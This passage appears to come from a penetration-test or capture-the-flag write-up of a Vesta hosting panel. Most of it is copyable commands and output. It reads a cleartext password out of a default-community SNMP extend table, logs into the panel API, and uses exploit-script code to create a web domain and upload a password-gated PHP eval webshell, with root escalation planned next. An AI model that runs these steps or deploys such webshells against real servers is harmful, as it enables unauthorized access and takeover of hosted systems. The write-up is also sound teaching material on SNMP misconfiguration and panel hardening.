+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s1">'server-status: %{http_code}\n'</span><span class="w"> </span>http://192.168.161.156/server-status
+curl<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s1">'8443 root:     %{http_code} %{size_download}\n'</span><span class="w"> </span>-k<span class="w"> </span>https://192.168.161.156:8443/
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>server-status: 502
+8443 root:     200 1055
+</pre></div>
+<p><code>502</code> means nginx proxies <code>/server-status</code> to Apache and Apache refuses — the status handler is not
+enabled. <code>8443</code> returns the same 1055-byte placeholder, confirming the Apache listeners are the
+<em>same</em> vhosts, not a separate application. There is no second web app here.</p>
+<h3>2.3 The panel on 8083</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-sk<span class="w"> </span>https://192.168.161.156:8083/<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-iE<span class="w"> </span><span class="s1">'title|static/js'</span>
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Vesta<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">"/static/js/2.5dc90ea3.chunk.js"</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">"/static/js/main.57f35a42.chunk.js"</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</pre></div>
+<p><code>&lt;div id="root"&gt;</code> and a webpack bundle named <strong><code>webpackJsonpreact-control-panel</code></strong> mean this is the
+<strong>React single-page frontend</strong>, which Vesta shipped in <strong>0.9.8-27</strong> (Nov 2021). The old PHP/XHTML
+login page is gone.</p>
+<p>That single fact rewrites the exploit table:</p>
+<table>
+<thead>
+<tr>
+<th>CVE</th>
+<th>Affects</th>
+<th>Status on a 0.9.8-27 build</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CVE-2019-9859</td>
+<td>≤ 0.9.8-23</td>
+<td>dead — panel is newer</td>
+</tr>
+<tr>
+<td>CVE-2020-10786</td>
+<td>≤ 0.9.8-26</td>
+<td>dead</td>
+</tr>
+<tr>
+<td>CVE-2020-10807 / CVE-2020-10808</td>
+<td>≤ 0.9.8-26</td>
+<td>dead</td>
+</tr>
+<tr>
+<td>CVE-2020-10966</td>
+<td>≤ 0.9.8-25</td>
+<td>dead</td>
+</tr>
+<tr>
+<td>CVE-2021-28379</td>
+<td>≤ 0.9.8-27</td>
+<td><strong>live</strong>, but needs an authenticated admin session</td>
+</tr>
+<tr>
+<td>API-key LPE (#2045)</td>
+<td>any build with <code>v-generate-api-key</code></td>
+<td><strong>live</strong>, post-foothold</td>
+</tr>
+</tbody>
+</table>
+<p>The React frontend does <strong>not</strong> mean the PHP API was hardened. <code>web/api/</code> and
+<code>web/upload/UploadHandler.php</code> are still underneath. But every remaining panel bug is
+<em>authenticated</em> — so the panel stops being the front door and becomes a credential-reuse target.</p>
+<h3>2.4 The false positive worth remembering</h3>
+<p>Probing for the upload handler produced this:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="k">for</span><span class="w"> </span>p<span class="w"> </span><span class="k">in</span><span class="w"> </span>/upload/index.php<span class="w"> </span>/upload/<span class="w"> </span>/api/index.php<span class="w"> </span>/api/<span class="w"> </span>/manifest.json<span class="w"> </span>/<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">  </span><span class="nb">printf</span><span class="w"> </span><span class="s1">'%-22s '</span><span class="w"> </span><span class="s2">"</span><span class="nv">$p</span><span class="s2">"</span>
+<span class="w">  </span>curl<span class="w"> </span>-sk<span class="w"> </span>-m<span class="w"> </span><span class="m">10</span><span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>-w<span class="w"> </span><span class="s1">'http=%{http_code} size=%{size_download}\n'</span><span class="w"> </span><span class="s2">"https://192.168.161.156:8083</span><span class="nv">$p</span><span class="s2">"</span>
+<span class="k">done</span>
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>/upload/index.php      http=200 size=2586
+/upload/               http=200 size=2586
+/api/index.php         http=200 size=0
+/api/                  http=200 size=0
+/manifest.json         http=404 size=1254
+/                      http=200 size=2586
+</pre></div>
+<p><code>/upload/index.php</code> looks like a live endpoint. It is not. <strong>It returns exactly the same 2586 bytes
+as <code>/</code></strong> because it is the same file: a 66-byte stub.</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-s<span class="w"> </span>https://raw.githubusercontent.com/outroll/vesta/master/web/upload/index.php
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="cp">&lt;?php</span> <span class="k">include</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'DOCUMENT_ROOT'</span><span class="p">]</span><span class="o">.</span><span class="s1">'/static/index.html'</span><span class="p">);</span> <span class="cp">?&gt;</span>
+</pre></div>
+<p>That is the entire file. It includes the SPA shell and returns 2586 bytes — identical to <code>/</code>,
+because it <em>is</em> <code>/</code>. <strong>Identical response sizes across "different" endpoints mean one file, not
+two.</strong> The real handler is <code>web/upload/UploadHandler.php</code> (54,838 bytes), and it is gated:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="x">include($_SERVER['DOCUMENT_ROOT']."/inc/main.php");   // -&gt; session_start()</span>
+<span class="x">if ((!isset($_SESSION['user'])) &amp;&amp; (!defined('NO_AUTH_REQUIRED'))) {</span>
+<span class="x">    header("Location: /login/"); exit;</span>
+<span class="x">}</span>
+</pre></div>
+<p>So unauthenticated upload is out. The <code>/api/</code> paths return <code>200</code> with a <strong>zero-byte body</strong> — the
+directory exists, the index is empty. Not an endpoint either.</p>
+<h3>2.5 Read the JS bundle instead of fuzzing</h3>
+<p>The React app has to name every API route it calls. That is cheaper than a wordlist.</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-sk<span class="w"> </span>https://192.168.161.156:8083/static/js/main.57f35a42.chunk.js<span class="w"> </span>-o<span class="w"> </span>main.js
+grep<span class="w"> </span>-oE<span class="w"> </span><span class="s1">'(api|upload)/[a-zA-Z0-9_./?=-]*'</span><span class="w"> </span>main.js<span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-u<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-40
+grep<span class="w"> </span>-oE<span class="w"> </span><span class="s1">'v-[a-z0-9-]+'</span><span class="w"> </span>main.js<span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-u<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-40
+</pre></div>
+<p>The <code>v-*</code> hits matter: every panel action is a wrapper around a script in
+<code>/usr/local/vesta/bin/</code>, invoked as <code>/usr/bin/sudo /usr/local/vesta/bin/&lt;script&gt;</code>. That design is
+the entire privilege story of the box — chapter 06.</p>
+<h3>2.6 Where this leaves us</h3>
+<p>The web surface is fully mapped and fully useless without a credential:</p>
+<ul>
+<li>No unauthenticated upload path.</li>
+<li>No reachable <code>server-status</code>.</li>
+<li>phpMyAdmin and Roundcube both present, both want a login.</li>
+<li>All remaining panel CVEs require a session.</li>
+</ul>
+<p><strong>The box is a credential problem, not an exploit problem.</strong> Chapter 03 gets the credential from a
+protocol that has no authentication at all.</p></div></section>
+<section class="chapter" id="ch-03" data-title="SNMP"><div class="ch-head"><span class="ch-num">03</span><div class="ch-title"><h2>SNMP</h2><p class="ch-sub">The host publishes its own password</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p><code>161/udp</code> answered to <code>public</code>. That gives unauthenticated read access to the MIB tree. On a Linux
+host with <code>net-snmp</code>, one subtree in that tree stores the <strong>command lines</strong> the daemon is configured
+to run — arguments included.</p>
+<hr />
+<h3>3.1 Where to look: the extend subtree</h3>
+<p>NET-SNMP's <code>extend</code> directive lets an administrator expose arbitrary command output as an OID. The
+daemon keeps three views of it:</p>
+<table>
+<thead>
+<tr>
+<th>OID</th>
+<th>Table</th>
+<th>Holds</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>1.3.6.1.4.1.8072.1.3.2.2</code></td>
+<td><code>nsExtendConfigTable</code></td>
+<td>command + <strong>arguments</strong> the daemon will execute</td>
+</tr>
+<tr>
+<td><code>1.3.6.1.4.1.8072.1.3.2.3</code></td>
+<td><code>nsExtendOutputFullTable</code></td>
+<td>stdout of the last run</td>
+</tr>
+<tr>
+<td><code>1.3.6.1.4.1.8072.1.3.2.4</code></td>
+<td><code>nsExtendConfigPersistTable</code></td>
+<td>persisted config</td>
+</tr>
+</tbody>
+</table>
+<p><code>nsExtendOutputFull</code> is the one everybody remembers, because it is human-readable. On this box the
+<strong>config</strong> table was the one that mattered — it holds the argument list, and the argument list
+contained a password.</p>
+<h3>3.2 Walk it</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="m">192</span>.168.161.156<span class="w"> </span><span class="m">1</span>.3.6.1.4.1.8072.1.3.2
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>iso.3.6.1.4.1.8072.1.3.2.1.0 = INTEGER: 2
+
+## nsExtendConfigTable — what the daemon runs
+iso.3.6.1.4.1.8072.1.3.2.2.1.2.14.114.101.115.101.116.45.112.97.115.115.119.111.114.100 = STRING: "/bin/sh"
+iso.3.6.1.4.1.8072.1.3.2.2.1.3.14.114.101.115.101.116.45.112.97.115.115.119.111.114.100 = STRING: "-c \"echo \\\"jack:3PUKsX98BMupBiCf\\\" | chpasswd\""
+
+iso.3.6.1.4.1.8072.1.3.2.2.1.2.18.114.101.115.101.116.45.112.97.115.115.119.111.114.100.45.99.109.100 = STRING: "/bin/echo"
+iso.3.6.1.4.1.8072.1.3.2.2.1.3.18.114.101.115.101.116.45.112.97.115.115.119.111.114.100.45.99.109.100 = STRING: "\"\\\"jack:3PUKsX98BMupBiCf\\\" | chpasswd\""
+
+## nsExtendOutputFullTable — what it printed
+iso.3.6.1.4.1.8072.1.3.2.3.1.1.14.114.101.115.101.116.45.112.97.115.115.119.111.114.100 = STRING: "Changing password for jack."
+iso.3.6.1.4.1.8072.1.3.2.3.1.2.18.114.101.115.101.116.45.112.97.115.115.119.111.114.100.45.99.109.100 = STRING: "\"jack:3PUKsX98BMupBiCf\" | chpasswd"
+
+## nsExtendConfigPersistTable — the cleanest copy
+iso.3.6.1.4.1.8072.1.3.2.4.1.2.18.114.101.115.101.116.45.112.97.115.115.119.111.114.100.45.99.109.100.1 = STRING: "\"jack:3PUKsX98BMupBiCf\" | chpasswd"
+</pre></div>
+<h3>3.3 Reading the OIDs</h3>
+<p>The ugly numeric indices are not random. An <code>extend</code> entry's OID is
+<code>&lt;column&gt;.&lt;len&gt;.&lt;ascii byte&gt;...</code> — the <strong>length</strong> of the entry name, then its characters as decimal
+ASCII.</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>14 . 114.101.115.101.116.45.112.97.115.115.119.111.114.100
+│     r   e   s   e   t   -   p   a   s   s   w   o   r   d
+└ 14 characters
+</pre></div>
+<p>So <code>.14.…</code> is the extend named <strong><code>reset-password</code></strong>, and <code>.18.…</code> is <strong><code>reset-password-cmd</code></strong>:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>18 . 114.101.115.101.116.45.112.97.115.115.119.111.114.100.45.99.109.100
+     r   e   s   e   t   -   p   a   s   s   w   o   r   d   -   c   m   d
+</pre></div>
+<p>That is not just cosmetic — it tells you the two entries are a <strong>pair</strong>, and that the admin's intent
+was "reset the password, and here is the command that does it". Which is exactly what the string
+says:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>"/bin/sh"  -c  "echo \"jack:3PUKsX98BMupBiCf\" | chpasswd"
+</pre></div>
+<p>Decoded: run <code>/bin/sh -c</code>, echo <code>jack:3PUKsX98BMupBiCf</code> into <code>chpasswd</code>. <code>chpasswd</code> reads
+<code>user:password</code> pairs from stdin and applies them.</p>
+<p><strong>The credential is <code>jack</code> : <code>3PUKsX98BMupBiCf</code>.</strong> Not a guess, not a crack — published by the host,
+in cleartext, to anyone who sends a UDP packet.</p>
+<h3>3.4 The output table confirms it</h3>
+<p><code>nsExtendOutputFull</code> for the entry returns:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>"Changing password for jack."
+</pre></div>
+<p><code>chpasswd</code> prints <code>Changing password for &lt;user&gt;.</code> on success and nothing on failure. So this is not
+merely a configured command — <strong>it had been executed successfully</strong>, and the daemon kept the output
+for us. Two independent OIDs, same secret.</p>
+<h3>3.5 Why this happens</h3>
+<p><code>/etc/snmp/snmpd.conf</code> usually gets an entry like:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>extend reset-password /bin/sh -c "echo \"jack:3PUKsX98BMupBiCf\" | chpasswd"
+</pre></div>
+<p>It is a legitimate provisioning or monitoring hook: some dashboard pings the OID to force a known
+password, and reads the result back. The mistake is structural rather than accidental —</p>
+<ol>
+<li>the community string is the default <code>public</code>, so the table is world-readable;</li>
+<li>the secret is passed as a <strong>command-line argument</strong>, and command lines are stored in the MIB;</li>
+<li>SNMPv1 has no per-user authentication, so there is no second gate.</li>
+</ol>
+<p>Two mitigations, either of which breaks the chain: a non-default community with an ACL, or passing
+the password by stdin/file instead of argv. The install had neither.</p>
+<h3>3.6 Verify the credential before you build on it</h3>
+<p>Vesta panel users are <strong>system users</strong>, so one credential can work in several places. Check the
+cheap ones first — a <code>200</code> here replaces an entire exploit chain.</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="c1">## SSH: is jack a login account?</span>
+ssh<span class="w"> </span>jack@192.168.161.156
+
+<span class="c1">## panel API: fetch a CSRF token, then authenticate</span>
+<span class="nv">TOK</span><span class="o">=</span><span class="k">$(</span>curl<span class="w"> </span>-sk<span class="w"> </span>https://192.168.161.156:8083/api/v1/login/session.php<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-oE<span class="w"> </span><span class="s1">'"token":"[a-f0-9]+"'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="s1">'"'</span><span class="w"> </span>-f4<span class="k">)</span>
+curl<span class="w"> </span>-sk<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s1">'login: %{http_code}\n'</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s2">"user=jack&amp;password=3PUKsX98BMupBiCf&amp;token=</span><span class="nv">$TOK</span><span class="s2">"</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>https://192.168.161.156:8083/api/v1/login/index.php
+
+<span class="c1">## mail: Dovecot / Roundcube use the same system account</span>
+curl<span class="w"> </span>-s<span class="w"> </span>--url<span class="w"> </span><span class="s1">'imap://192.168.161.156/'</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">'jack:3PUKsX98BMupBiCf'</span><span class="w"> </span>-v<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-iE<span class="w"> </span><span class="s1">'OK|NO|Login'</span>
+</pre></div>
+<p>The panel API does <strong>not</strong> use HTTP basic auth — it is session-based with a CSRF token, which is why
+the token fetch comes first.</p>
+<p>On this box the panel was the way in — chapter 04. Note what is <em>not</em> true: this is a <strong>regular
+panel user</strong>, not an administrator. The escalation in chapter 06 is reached from that unprivileged
+account, which is why the box is worth writing up.</p></div></section>
+<section class="chapter" id="ch-04" data-title="Panel access"><div class="ch-head"><span class="ch-num">04</span><div class="ch-title"><h2>Panel access</h2><p class="ch-sub">A session, and what a session is worth</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p><code>jack</code> is a regular panel user. Not an admin. Everything in chapters 05 and 06 happens from that
+unprivileged account, which is the point of the box.</p>
+<hr />
+<h3>4.1 The login is not a form</h3>
+<p>The React frontend talks to a PHP API under <code>/api/v1/</code>. Two requests are needed: one to obtain a
+CSRF token, one to authenticate with it.</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="c1">## 1. token</span>
+curl<span class="w"> </span>-sk<span class="w"> </span>https://192.168.161.156:8083/api/v1/login/session.php
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="p">{</span><span class="nt">"token"</span><span class="p">:</span><span class="s2">"a1b2c3d4e5f6..."</span><span class="p">}</span>
+</pre></div>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="c1">## 2. authenticate (form-encoded, not JSON, and not HTTP basic auth)</span>
+<span class="nv">TOK</span><span class="o">=</span><span class="k">$(</span>curl<span class="w"> </span>-sk<span class="w"> </span>https://192.168.161.156:8083/api/v1/login/session.php<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-oE<span class="w"> </span><span class="s1">'"token":"[a-f0-9]+"'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="s1">'"'</span><span class="w"> </span>-f4<span class="k">)</span>
+curl<span class="w"> </span>-sk<span class="w"> </span>-c<span class="w"> </span>cookies.txt<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s1">'%{http_code}\n'</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s2">"user=jack&amp;password=3PUKsX98BMupBiCf&amp;token=</span><span class="nv">$TOK</span><span class="s2">"</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>https://192.168.161.156:8083/api/v1/login/index.php
+</pre></div>
+<p>The exploit script reports the outcome explicitly:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>[INFO] Attempting login to https://192.168.161.156:8083 as jack
+[+] Logged in as jack
+</pre></div>
+<p><strong>Reading it:</strong></p>
+<ul>
+<li>The token is issued <strong>before</strong> authentication. It is a CSRF control, not a credential — anyone can
+  get one.</li>
+<li>The session lands in a <code>PHPSESSID</code> cookie. Every later call needs <code>-b cookies.txt</code>.</li>
+<li>The status code is <strong>not</strong> a reliable signal here. Check that a <code>PHPSESSID</code> was set and that a
+  follow-up authenticated call returns data instead of a redirect to <code>/login/</code>.</li>
+</ul>
+<p><code>inc/main.php</code> is the gate every authenticated page includes:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="x">session_start();</span>
+<span class="x">if ((!isset($_SESSION['user'])) &amp;&amp; (!defined('NO_AUTH_REQUIRED'))) {</span>
+<span class="x">    header("Location: /login/"); exit;</span>
+<span class="x">}</span>
+</pre></div>
+<p>It also pins the session to the client IP:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="x">if($_SESSION['user_combined_ip'] != $user_combined_ip &amp;&amp; $_SERVER['REMOTE_ADDR'] != '127.0.0.1'){</span>
+<span class="x">    session_destroy(); header("Location: /login/"); exit;</span>
+<span class="x">}</span>
+</pre></div>
+<p>So the cookie only works from the IP that created it — and <code>127.0.0.1</code> is exempt. Remember that
+exemption if you ever get local access; it is how the panel's own cron/CLI calls authenticate.</p>
+<h3>4.2 What jack can reach</h3>
+<p>The API is a flat set of verbs, each mapping to one panel script:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>/api/v1/list/web/index.php      /api/v1/add/web/index.php
+/api/v1/list/mail/index.php     /api/v1/add/mail/index.php
+/api/v1/edit/mail/index.php     /api/v1/delete/mail/index.php
+/api/v1/upload/?dir=&lt;path&gt;
+/api/v1/login/session.php       /api/v1/logout/index.php
+</pre></div>
+<p>Two of these are the whole exploit: <strong><code>add/web</code> + <code>upload</code></strong> give file write into a served docroot,
+and <strong><code>edit/mail</code></strong> reaches a privileged shell. Chapter 05.</p>
+<p>Note what is <em>not</em> here: nothing in the list is an admin-only verb. <code>jack</code> is allowed to create web
+domains, create mail domains, add mailboxes, and upload files — because that is what a hosting
+customer does. The bug is not the authorisation check. The bug is what the panel does <em>with</em> the
+values a customer supplies.</p>
+<h3>4.3 The design that makes it exploitable</h3>
+<p>Every panel action is a thin PHP wrapper over a shell script in <code>/usr/local/vesta/bin/</code>:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="x">define('VESTA_CMD', '/usr/bin/sudo /usr/local/vesta/bin/');</span>
+</pre></div>
+<p>That single line explains the entire privilege model: <strong>the panel runs <code>/usr/local/vesta/bin/v-*</code>
+as root on behalf of a normal user.</strong> Argument construction is string concatenation. Any field that
+reaches a <code>v-*</code> script is a root-context substring, and quoting is the only thing standing between a
+customer and root.</p>
+<p>So the question on a Vesta box is never <em>"is there an injection"</em>. It is <em>"which field reaches a
+<code>v-*</code> script, and is it quoted?"</em></p>
+<h3>4.4 What we did not get</h3>
+<p>Worth recording, because it constrains the write-up:</p>
+<ul>
+<li>No <code>admin</code> panel account. The escalation does not need one.</li>
+<li>No MySQL credential. <code>3306</code> completed a handshake but no login was obtained — and none was
+  needed for this path.</li>
+<li>No SSH shell as <code>jack</code> was required. The panel route reached the same account with fewer steps.</li>
+</ul>
+<p>The next chapter turns the session into code execution as <code>jack</code>, and then into root.</p></div></section>
+<section class="chapter" id="ch-05" data-title="Foothold"><div class="ch-head"><span class="ch-num">05</span><div class="ch-title"><h2>Foothold</h2><p class="ch-sub">File write into a docroot, execution as the vhost user</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>The panel lets a customer create a web domain and upload files into it. That is the product working
+as intended. It also means the customer controls PHP source that Apache will execute.</p>
+<hr />
+<h3>5.1 Create a web domain</h3>
+<p>A panel user can only create domains under their own account, which is fine — we own <code>jack</code>.</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nv">TOK</span><span class="o">=</span><span class="k">$(</span>curl<span class="w"> </span>-sk<span class="w"> </span>https://192.168.161.156:8083/api/v1/login/session.php<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-oE<span class="w"> </span><span class="s1">'"token":"[a-f0-9]+"'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="s1">'"'</span><span class="w"> </span>-f4<span class="k">)</span>
+
+curl<span class="w"> </span>-sk<span class="w"> </span>-b<span class="w"> </span>cookies.txt<span class="w"> </span>-c<span class="w"> </span>cookies.txt<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s2">"ok=add"</span><span class="w"> </span>-d<span class="w"> </span><span class="s2">"token=</span><span class="nv">$TOK</span><span class="s2">"</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s2">"v_domain=4wfarbc2dg.poc"</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s2">"v_ip=&lt;panel-ip&gt;"</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s2">"v_aliases=www.4wfarbc2dg.poc"</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s2">"v_dns=on"</span><span class="w"> </span>-d<span class="w"> </span><span class="s2">"v_mail=on"</span><span class="w"> </span>-d<span class="w"> </span><span class="s2">"v_proxy=on"</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>https://192.168.161.156:8083/api/v1/add/web/index.php
+</pre></div>
+<p>The script does this defensively: it lists existing web domains first, and reuses one if the random
+<code>.poc</code> name already exists.</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="n">r</span> <span class="o">=</span> <span class="n">us</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">targetHost</span> <span class="o">+</span> <span class="s1">'/api/v1/list/web/index.php'</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+<span class="o">...</span>
+<span class="n">r2</span> <span class="o">=</span> <span class="n">us</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">targetHost</span> <span class="o">+</span> <span class="s1">'/api/v1/add/web/index.php'</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
+    <span class="s2">"ok"</span><span class="p">:</span> <span class="s2">"add"</span><span class="p">,</span> <span class="s2">"token"</span><span class="p">:</span> <span class="n">getSession</span><span class="p">(</span><span class="n">us</span><span class="p">,</span> <span class="n">targetHost</span><span class="p">,</span> <span class="mi">2</span><span class="p">)[</span><span class="s1">'token'</span><span class="p">],</span>
+    <span class="s2">"v_domain"</span><span class="p">:</span> <span class="n">shellHost</span><span class="p">,</span> <span class="s2">"v_ip"</span><span class="p">:</span> <span class="n">selectedIP</span><span class="p">,</span> <span class="s2">"v_aliases"</span><span class="p">:</span> <span class="s2">"www."</span> <span class="o">+</span> <span class="n">shellHost</span><span class="p">,</span>
+    <span class="s2">"v_dns"</span><span class="p">:</span> <span class="s2">"on"</span><span class="p">,</span> <span class="s2">"v_mail"</span><span class="p">:</span> <span class="s2">"on"</span><span class="p">,</span> <span class="s2">"v_proxy"</span><span class="p">:</span> <span class="s2">"on"</span><span class="p">,</span> <span class="s2">"v_proxy_ext"</span><span class="p">:</span> <span class="n">webConf</span><span class="p">[</span><span class="s1">'proxy_ext'</span><span class="p">]})</span>
+</pre></div>
+<p>Creating the domain builds the directory tree:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>/home/jack/web/4wfarbc2dg.poc/public_html/
+</pre></div>
+<h3>5.2 Upload a webshell into it</h3>
+<p><code>/api/v1/upload/</code> takes a <code>dir</code> query parameter and a multipart file — the <em>same</em> handler that
+refuses unauthenticated callers. Authenticated, it is a general file-write primitive.</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="n">r</span> <span class="o">=</span> <span class="n">us</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">targetHost</span> <span class="o">+</span> <span class="s1">'/api/v1/upload/?dir=/home/'</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span> <span class="s1">'/web/'</span> <span class="o">+</span> <span class="n">shellHost</span> <span class="o">+</span> <span class="s1">'/public_html'</span><span class="p">,</span>
+            <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span>
+            <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s1">'files'</span><span class="p">:</span> <span class="p">(</span><span class="s1">'ownwebshell.php'</span><span class="p">,</span>
+                             <span class="s1">'&lt;?php</span><span class="se">\n</span><span class="s1">if(@$_GET["password"]!="e43c9f07ed59712efa492aa0ae259cd0") exit();</span><span class="se">\n</span><span class="s1">'</span>
+                             <span class="s1">'eval($_GET["e"]);'</span><span class="p">)})</span>
+</pre></div>
+<p>The shell itself:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="cp">&lt;?php</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"password"</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">"e43c9f07ed59712efa492aa0ae259cd0"</span><span class="p">)</span> <span class="k">exit</span><span class="p">();</span>
+<span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"e"</span><span class="p">]);</span>
+</pre></div>
+<p>A shared secret gates it — so an opportunistic scanner that finds <code>ownwebshell.php</code> gets nothing.
+That is worth copying in your own PoCs: an unauthenticated <code>eval()</code> on a test box is how writeups get
+turned into someone else's access.</p>
+<p><strong>Reading the primitive:</strong></p>
+<ul>
